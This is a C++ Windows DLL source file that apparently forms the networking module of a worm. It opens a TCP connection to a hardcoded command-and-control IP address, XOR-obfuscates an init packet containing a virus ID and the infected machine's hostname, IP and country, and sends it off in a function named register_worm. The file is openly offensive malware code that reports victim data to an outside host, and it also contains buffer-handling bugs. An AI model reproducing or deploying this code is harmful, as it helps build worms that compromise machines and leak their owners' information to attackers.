#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <cstring>
#include <string.h>
#include <stdlib.h>
#include "networking.h"
#include <iostream>

#define DEFAULT_BUFLEN 32

#pragma comment(lib, "Ws2_32.lib")


/* Function: Function to create socket and connection with the C2 server  
*  Input: the hostname and port of the C2 server
*  Output: Handle for connection
*/
__declspec(dllexport) SOCKET connect_to_c2(const char *hostname, const char *port){
	
	/* Initialize Winsock */
	WSADATA wsaData;

	/* Initialize WSA */
	std::cout << " --- Initializing WSA" << std::endl; 
	int iResult;
	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
	if(iResult != 0){
		std::cout << "WSA Startup failed: " << iResult << std::endl;
		return 1;
	}

	/* Initialize Socket */
	struct addrinfo *result = NULL, *ptr = NULL, hints;
	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	std::cout << " --- Initializing Socket" << std::endl;

	/* Resolve Server Address & Port */
	iResult = getaddrinfo(hostname, port, &hints, &result);
	if(iResult != 0){
		std::cout << "getaddrinfo failed: " << iResult << std::endl; 
		WSACleanup();
		return 1;
	}
	std::cout << " --- Resolving Server Address & Port" << std::endl;
	/* Create Socket Object */
	SOCKET ConnectSocket = INVALID_SOCKET;
	ptr = result;

	/* Socket Error Check */
	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
	if(ConnectSocket == INVALID_SOCKET){
		std::cout << "Error at socket9 : " << WSAGetLastError() << std::endl;
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	/* Connect to a Socket */
	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
	if(iResult == SOCKET_ERROR){
		closesocket(ConnectSocket);
		ConnectSocket = INVALID_SOCKET;
	}
	std::cout << " --- Connecting to Socket " << std::endl;

	/* Connection Error Check */
	freeaddrinfo(result);
	if(ConnectSocket == INVALID_SOCKET){
		std::cout << "Unable to connect to server! " << std::endl;
		WSACleanup();
		return 1;
	}

	return ConnectSocket;
}

/* Function: Send a Constructed Message to the C2 server and receive the response data 
*  Input: Encrypted Packet Buffer
*  Output: Response Packet
*/
		       
__declspec(dllexport) int send_to_c2(char *encrypted_data, SOCKET ConnectSocket){
	char recvbuf[DEFAULT_BUFLEN];
	int iResult;

	std::cout << " --- Sending to Socket " << std::endl;

	iResult = send(ConnectSocket, encrypted_data, (int) strlen(encrypted_data), 0);
	if(iResult == SOCKET_ERROR){
		std::cout << "send failed: " << WSAGetLastError() << std::endl;
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	iResult = shutdown(ConnectSocket, SD_SEND);

	std::cout << " --- Close Socket " << std::endl;
	
	/* Disconnect from C2 */
	if(iResult == SOCKET_ERROR){
		std::cout << "shutdown failed: " << WSAGetLastError() << std::endl;
		closesocket(ConnectSocket);
		WSACleanup();
		return 1;
	}

	std::cout << " --- Disconnecting from C2" << std::endl;

	/* Receive Data */
	std::cout << " --- Receiving Data" << std::endl;
	do {
		iResult = recv(ConnectSocket, recvbuf, sizeof(recvbuf), 0);
		if(iResult > 0){
			std::cout << "Bytes received: " << iResult <<std::endl;
		}
		else if (iResult == 0)
			std::cout << "Connection closed " << std::endl;
		else
			std::cout << "recv failed: " << WSAGetLastError() << std::endl;
	} while(iResult > 0);

	return 0;
}

/* Function: Encrypts a Data packet from plaintext buffer 
*  Input: Encrypted Packet Buffer
*  Output: Response Packet
*/

__declspec(dllexport) char *encryption(char *decrypted_data){
	int i;
	//char* encrypted_data = (char*)malloc(32);

	/* Extract XOR key */
	char XOR_key = decrypted_data[0];
	
	/* Apply XOR key to rest of the buffer */
	for(i=1; i < strlen(decrypted_data); ++i){
		//encrypted_data += 1;
		//std::cout << int(decrypted_data[i]) << " - ";
		decrypted_data[i] = decrypted_data[i] ^ XOR_key;
		//std::cout << int(decrypted_data[i]) << std::endl; 
	}

	std::cout << std::endl;
	
	return decrypted_data;
}

/* Function: Decrypts a Data packet 
*  Input: Encrypted Packet Buffer
*  Output: Decrypted Packet
*/
		       
__declspec(dllexport) char *decryption(char *encrypted_data){
	int i;
	//char* decrypted_data = (char*) malloc(32);

	/* Extract XOR key */
	char XOR_key = encrypted_data[0];

	/* Apply XOR key to rest of the buffer */
	for(i=1; i < strlen(encrypted_data); ++i){
		//std::cout << int(encrypted_data[i]) << " - ";
		encrypted_data[i] = encrypted_data[i] ^ XOR_key;
		//std::cout << int(encrypted_data[i]) << std::endl;
	}
	//decrypted_data[31] = '\0';

	//std::cout << std::endl;
	return encrypted_data;
}

/* Function: Takes variable length inputs and ensures that the init packet is the correct format (See Google Drive for specific details) 
*  Input: Variables to be inserted into the server database
*  Output: A single combined packet in the correct format
*/

__declspec(dllexport) char *structure_init_message(char XOR_key, const char *virus_id, const char *hostname, const char *ip, const char *country){

	/* Allocate buffers */
	char *buffer = (char*)malloc(sizeof(CHAR) * 32); 
	char *virus_id_10 = (char *)malloc(sizeof(CHAR)*10);
	char *hostname_10 = (char *)malloc(sizeof(CHAR)*10);
	char *ip_10 = (char *)malloc(sizeof(CHAR)*10);
	char *country_2 = (char *)malloc(sizeof(CHAR)*2);

	/* Set buffer to Nulls */
	memset(buffer, '\0', sizeof(buffer));
	memset(virus_id_10, '\0', sizeof(virus_id_10));
	memset(hostname_10, '\0', sizeof(hostname_10));
	memset(ip_10, '\0', sizeof(ip_10));
	memset(country_2, '\0', sizeof(country_2));

	/* Copy variables into their correct sizes */
	strncpy(virus_id_10, virus_id, 10);
	strncpy(hostname_10, hostname, 10);
	strncpy(ip_10, virus_id, 10);
	strncpy(country_2, country, 2);

	/* Create Message Buffer */
	buffer[0] = XOR_key;
	strncat(buffer, virus_id, 10);
	strncat(buffer, hostname, 10);
	strncat(buffer, ip, 10);
	strncat(buffer, country, 2);	
	

	return buffer;
}

/* Function: Main Driver function for the first contact with server, utlizies previously defined functions 
*  Input: Variables to be sent to the database
*  Output: Server verification
*/
__declspec(dllexport) int register_worm(char XOR_key, char *virus_id, char *hostname, char *ip, char *country){
	const char* server_hostname = "13.56.156.46";
	const char* port = "5000";
	SOCKET sock = connect_to_c2(server_hostname, port);
	char *message = structure_init_message(XOR_key, virus_id, hostname, ip, country);
	char *encrypted_message = encryption(message);
	int result = send_to_c2(encrypted_message, sock);
	std::cout << "worm should be registered!" << std::endl;
	return result;
}
